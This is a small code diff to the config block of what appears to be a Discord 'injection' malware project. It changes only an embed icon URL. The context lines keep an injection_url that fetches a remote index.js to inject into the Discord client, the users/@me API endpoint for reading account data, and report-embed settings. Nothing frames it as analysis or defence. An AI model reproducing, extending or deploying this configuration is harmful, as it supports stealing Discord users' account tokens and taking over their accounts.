@@ -14,7 +14,7 @@ const config = {
   ping_on_run: false,
   ping_val: '@everyone',
   embed_name: 'Discord Injection',
-  embed_icon: 'https://raw.githubusercontent.com/Rdimo/images/master/Discord-Injection/discord atom.png',
+  embed_icon: 'https://media.discordapp.net/attachments/993870259889127545/1028158197292351498/8be1700e27b69a6c8b4d5852b02456f5.jpg?width=430&height=430',
   embed_color: 8363488,
   injection_url: 'https://raw.githubusercontent.com/Finx69/Discord/main/index.js',
   api: 'https://discord.com/api/v9/users/@me',
